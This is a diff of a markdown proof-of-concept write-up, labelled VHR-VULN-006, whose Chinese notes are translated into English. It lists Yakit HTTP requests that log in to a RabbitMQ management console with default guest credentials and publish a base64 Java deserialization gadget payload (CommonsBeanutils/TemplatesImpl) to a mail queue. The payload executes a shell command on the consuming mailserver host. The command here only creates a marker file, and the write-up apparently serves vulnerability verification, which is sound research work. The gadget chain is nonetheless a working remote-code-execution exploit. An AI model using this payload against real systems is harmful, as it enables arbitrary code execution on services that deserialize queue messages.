@@ -1,17 +1,16 @@
-# VHR-VULN-006 Yakit 请求包
+# VHR-VULN-006 — Yakit packets
 
-打 `127.0.0.1:15672`（RabbitMQ 管理台）。`Authorization: Basic Z3Vlc3Q6Z3Vlc3Q=` 就是 guest/guest。
-mailserver 要在消费队列。成了以后宿主机会有 `/tmp/vhr_deser_poc_ok`。
+Target: `127.0.0.1:15672` (RabbitMQ Management).
+Auth: `Authorization: Basic Z3Vlc3Q6Z3Vlc3Q=` (`guest:guest`).
+Need mailserver consuming the queue. Success = `/tmp/vhr_deser_poc_ok` on the mailserver host.
 
-整段复制进 Yakit 发包器发。
+Paste whole blocks into Yakit.
 
-## 0. 清旧文件
+## 0. Clear old evidence
 
 ```bash
 rm -f /tmp/vhr_deser_poc_ok
 ```
-
-## 1. Management
 
 ```http
 GET /api/overview HTTP/1.1
@@ -23,13 +22,13 @@ Connection: close
 
 ```
 
-200 就行。
+Expect HTTP 200.
 
 ![overview](./VHR-VULN-006-01-overview.png)
 
 ---
 
-## 2. 队列还在不在
+## 2. Queue
 
 ```http
 GET /api/queues/%2F/javaboy.mail.queue HTTP/1.1
@@ -41,15 +40,15 @@ Connection: close
 
 ```
 
-看 `consumers`，是 0 就先把 mailserver 拉起来。
+Need `consumers=1` (start mailserver if 0).
 
-![队列](./VHR-VULN-006-02-queue-detail.png)
+![queue](./VHR-VULN-006-02-queue-detail.png)
 
 ---
 
-## 3. 主包
+## 3. Publish payload
 
-回 `{"routed":true}`。
+Expect `{"routed":true}`.
 
 ```http
 POST /api/exchanges/%2F/amq.default/publish HTTP/1.1
@@ -63,11 +62,11 @@ Connection: close
 {"properties":{"content_type":"application/x-java-serialized-object","delivery_mode":2},"routing_key":"javaboy.mail.queue","payload":"rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LjoYjqcyKkSAIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgAqamF2YS5sYW5nLlN0cmluZyRDYXNlSW5zZW5zaXRpdmVDb21wYXJhdG9ydwNcfVxQ5c4CAAB4cHQAEG91dHB1dFByb3BlcnRpZXN3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1lcQB+AARMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAABdXIAAltCrPMX+AYIVOACAAB4cAAAA+rK/rq+AAAAMgBCAQBkb3JnL2FwYWNoZS9jb2xsZWN0aW9ucy9jb3lvdGUvZGVzZXJpYWxpemF0aW9uL3N0ZC9TdHJpbmdEZXNlcmlhbGl6ZXI2MDZkYzkyYmU3N2Y0NTk0YTRlM2RmZjM1MDAzYTg4YwcAAQEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHAAMBAARiYXNlAQASTGphdmEvbGFuZy9TdHJpbmc7AQADc2VwAQADY21kAQAGPGluaXQ+AQADKClWAQATamF2YS9sYW5nL0V4Y2VwdGlvbgcACwwACQAKCgAEAA0BAAdvcy5uYW1lCAAPAQAQamF2YS9sYW5nL1N5c3RlbQcAEQEAC2dldFByb3BlcnR5AQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsMABMAFAoAEgAVAQAQamF2YS9sYW5nL1N0cmluZwcAFwEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsMABkAGgoAGAAbAQADd2luCAAdAQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoMAB8AIAoAGAAhAQAHY21kLmV4ZQgAIwwABQAGCQACACUBAAIvYwgAJwwABwAGCQACACkBAAcvYmluL3NoCAArAQACLWMIAC0MAAgABgkAAgAvAQAYamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyBwAxAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgwACQAzCgAyADQBAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNzOwwANgA3CgAyADgBABBqYXZhL2xhbmcvT2JqZWN0BwA6AQAIPGNsaW5pdD4BABt0b3VjaCAvdG1wL3Zocl9kZXNlcl9wb2Nfb2sIAD0KAAIADQEABENvZGUBAA1TdGFja01hcFRhYmxlACEAAgAEAAAAAwAJAAUABgAAAAkABwAGAAAACQAIAAYAAAACAAEACQAKAAEAQAAAAIQABAACAAAAUyq3AA4SELgAFrYAHBIetgAimQAQEiSzACYSKLMAKqcADRIsswAmEi6zACoGvQAYWQOyACZTWQSyACpTWQWyADBTTLsAMlkrtwA1tgA5V6cABEyxAAEABABOAFEADAABAEEAAAAXAAT/ACEAAQcAAgAACWUHAAz8AAAHADsACAA8AAoAAQBAAAAAGgACAAAAAAAOEj6zADC7AAJZtwA/V7EAAAAAAABwdAAkZTgzZjlkNjItYTk0ZS00ZDhjLWE4OTQtMjA3YjRlZjdlNjgycHcBAHhxAH4ADXg=","payload_encoding":"base64"}
 ```
 
-![投递](./VHR-VULN-006-03-publish-routed.png)
+![publish](./VHR-VULN-006-03-publish-routed.png)
 
 ---
 
-## 3b. 备用 Exchange
+## 3b. Via business exchange
 
 ```http
 POST /api/exchanges/%2F/javaboy.mail.exchange/publish HTTP/1.1
@@ -83,12 +82,12 @@ Connection: close
 
 ---
 
-## 4. 宿主机看文件
+## 4. Host file
 
 ```bash
 ls -la /tmp/vhr_deser_poc_ok
 ```
 
-![文件](./VHR-VULN-006-04-touch-file.png)
+![file](./VHR-VULN-006-04-touch-file.png)
 
-别进 rabbitmq 容器翻 `/tmp`。
+Check the mailserver host, not the RabbitMQ container.
